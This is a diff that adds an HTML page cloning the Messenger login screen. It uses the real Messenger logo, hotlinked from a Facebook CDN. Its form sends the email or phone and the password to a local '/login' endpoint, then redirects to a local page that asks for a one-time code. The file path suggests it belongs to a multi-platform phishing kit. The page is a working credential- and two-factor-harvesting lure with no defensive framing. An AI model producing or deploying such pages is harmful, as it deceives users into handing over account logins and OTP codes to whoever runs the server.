@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messenger - Log In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo {
+            width: 112px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #65676b;
+            font-size: 15px;
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 15px;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+        .form-control {
+            width: 100%;
+            height: 40px;
+            padding: 0 8px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 15px;
+            color: #1c1e21;
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .login-btn {
+            width: 100%;
+            height: 40px;
+            background-color: #0084ff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .login-btn:hover {
+            background-color: #0070db;
+        }
+        .help-text {
+            margin-top: 16px;
+            text-align: center;
+            font-size: 14px;
+            color: #65676b;
+        }
+        .help-text a {
+            color: #0084ff;
+            text-decoration: none;
+        }
+        .help-text a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://scontent-los2-1.xx.fbcdn.net/v/t39.8562-6/120009688_325579128711709_1736249742330805861_n.png?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=6oN4Q3zlh9oQ7kNvgFpAigh&_nc_oc=AdiCfRbW3KKWlOS0eaRJmScOROf6g-QLXi0WeeeYSRzykV0EcGinfW7_Ir40LqZqBdm61FFIIweKYe1WqoOB4vsQ&_nc_zt=14&_nc_ht=scontent-los2-1.xx&_nc_gid=AnSO9KWXrwUgIK5RzUkItgZ&oh=00_AYDLFBxlO7QyEiuZKQy1ArgI_277IIXmFyC7QKA-8ASgVg&oe=67AEDE3D" alt="Messenger" class="logo" style="width: 60px; height: 60px;">
+            <h1>Messenger</h1>
+            <p class="subtitle">Connect with your friends and the world around you on Messenger.</p>
+        </div>
+        <form method="POST" action="/login?platform=messenger" id="loginForm">
+            <div class="form-group">
+                <label for="email">Email or Phone</label>
+                <input type="text" id="email" name="email" class="form-control" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" class="form-control" required>
+            </div>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+        <p class="help-text">
+            <a href="#">Forgot Password?</a><br>
+            <a href="#">Create New Account</a>
+        </p>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            
+            fetch(this.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    if (data.require_otp) {
+                        window.location.href = '/social/messenger/otp.html';
+                    } else {
+                        window.location.href = data.redirect_url;
+                    }
+                } else {
+                    console.error('Error:', data.error);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html> 
